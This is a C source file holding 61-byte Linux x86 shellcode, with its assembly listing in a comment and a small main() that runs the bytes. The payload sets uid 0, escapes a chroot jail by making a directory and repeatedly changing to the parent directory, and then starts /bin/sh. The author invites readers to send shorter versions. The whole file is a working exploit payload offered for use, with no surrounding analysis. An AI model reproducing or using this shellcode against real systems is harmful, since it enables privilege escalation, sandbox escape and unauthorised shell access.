/*
	setuid(0) + chroot break + execve() /bin/sh, 61 bytes
	by sd@cdi.cz, if you can make it _shorter_ than 61 bytes, please
	send me changes.

# setuid(0)
	push	$0x17
	pop	%eax
	xor	%ebx, %ebx
	int	$0x80

	push	%ebx
	mov	%ebx, %ecx

# mkdir("sd..")
	.byte	0x68
	.ascii	"sd.."
	mov	%esp, %ebx
	mov	$0xed, %cl
	mov	$0x27, %al
	int	$0x80

# chroot("sd..")
	push	$0x3d		# mkdir MAY fail!
	pop	%eax
	push	%eax
	int	$0x80

# chdir("..") 0xed times
	inc	%ebx
	inc	%ebx
1:	mov	$0xc, %al
	int	$0x80
	loop	1b

# chroot("..");
	pop	%eax
	int	$0x80

# execve("/bin/sh")
	push	%ecx
	.byte	0x68
	.ascii	"n/sh"
	.byte	0x68
	.ascii	"//bi"
	mov    %esp,%ebx
	push   %ecx
	push   %ebx
	mov    %esp,%ecx
	mov    $0xb,%al
	int    $0x80
	.byte	0
*/


unsigned char sc[] =
	"\x6a\x17\x58\x31\xdb\xcd\x80\x53"
	"\x89\xd9\x68\x73\x64\x2e\x2e\x89"
	"\xe3\xb1\xed\xb0\x27\xcd\x80\x6a"
	"\x3d\x58\x50\xcd\x80\x43\x43\xb0"
	"\x0c\xcd\x80\xe2\xfa\x58\xcd\x80"
	"\x51\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x51\x53\x89"
	"\xe1\xb0\x0b\xcd\x80";

int	main()
{
	void		(*execme)() = (void *) sc;
	execme();
	return 0;
}
